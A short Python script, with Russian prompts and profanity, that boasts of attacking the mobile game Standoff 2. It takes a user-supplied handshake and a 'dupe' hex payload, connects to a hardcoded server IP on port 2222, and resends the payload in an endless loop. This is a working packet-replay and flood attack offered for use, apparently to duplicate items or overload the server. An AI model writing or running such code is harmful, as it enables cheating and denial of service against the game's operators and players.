print("Осторожно это ебалка стандофф 2")
import socket
a = input("Введите хендшейк:")
b = input("Введи хекс для дюпа:")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('3.121.14.176', 2222))
sock.send(bytes.fromhex(a))
while 1:
    sock.send(bytes.fromhex(b))
    print("Ты успешно начал ебать стандофф2")
